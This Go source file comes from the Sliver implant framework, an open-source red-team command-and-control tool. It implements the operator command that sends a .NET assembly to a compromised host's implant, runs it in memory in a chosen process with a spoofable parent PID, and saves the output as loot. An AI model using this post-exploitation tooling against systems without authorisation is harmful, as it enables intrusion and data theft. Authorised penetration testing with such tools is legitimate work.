package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"io/ioutil"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

// ExecuteAssemblyCmd - Execute a .NET assembly in-memory
func ExecuteAssemblyCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	assemblyPath := ctx.Args.String("filepath")
	isDLL := false
	if filepath.Ext(assemblyPath) == ".dll" {
		isDLL = true
	}
	if isDLL {
		if ctx.Flags.String("class") == "" || ctx.Flags.String("method") == "" {
			con.PrintErrorf("Please provide a class name (namespace.class) and method\n")
			return
		}
	}
	assemblyBytes, err := ioutil.ReadFile(assemblyPath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}

	assemblyArgs := ctx.Args.StringList("arguments")
	process := ctx.Flags.String("process")
	processArgs := strings.Split(ctx.Flags.String("process-arguments"), " ")

	assemblyArgsStr := strings.Join(assemblyArgs, " ")
	assemblyArgsStr = strings.TrimSpace(assemblyArgsStr)

	ctrl := make(chan bool)
	con.SpinUntil("Executing assembly ...", ctrl)
	execAssembly, err := con.Rpc.ExecuteAssembly(context.Background(), &sliverpb.ExecuteAssemblyReq{
		Request:     con.ActiveTarget.Request(ctx),
		IsDLL:       isDLL,
		Process:     process,
		Arguments:   assemblyArgsStr,
		Assembly:    assemblyBytes,
		Arch:        ctx.Flags.String("arch"),
		Method:      ctx.Flags.String("method"),
		ClassName:   ctx.Flags.String("class"),
		AppDomain:   ctx.Flags.String("app-domain"),
		ProcessArgs: processArgs,
		PPid:        uint32(ctx.Flags.Int("ppid")),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s", err)
		return
	}
	hostName := getHostname(session, beacon)
	if execAssembly.Response != nil && execAssembly.Response.Async {
		con.AddBeaconCallback(execAssembly.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, execAssembly)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}

			HandleExecuteAssemblyResponse(execAssembly, assemblyPath, hostName, ctx, con)
		})
		con.PrintAsyncResponse(execAssembly.Response)
	} else {
		HandleExecuteAssemblyResponse(execAssembly, assemblyPath, hostName, ctx, con)
	}
}

func HandleExecuteAssemblyResponse(execAssembly *sliverpb.ExecuteAssembly, assemblyPath string, hostName string, ctx *grumble.Context, con *console.SliverConsoleClient) {
	saveLoot := ctx.Flags.Bool("loot")
	lootName := ctx.Flags.String("name")

	if execAssembly.GetResponse().GetErr() != "" {
		con.PrintErrorf("Error: %s\n", execAssembly.GetResponse().GetErr())
		return
	}

	PrintExecutionOutput(string(execAssembly.GetOutput()), ctx.Flags.Bool("save"), ctx.Command.Name, hostName, con)

	if saveLoot {
		LootExecute(execAssembly.GetOutput(), lootName, ctx.Command.Name, assemblyPath, hostName, con)
	}
}
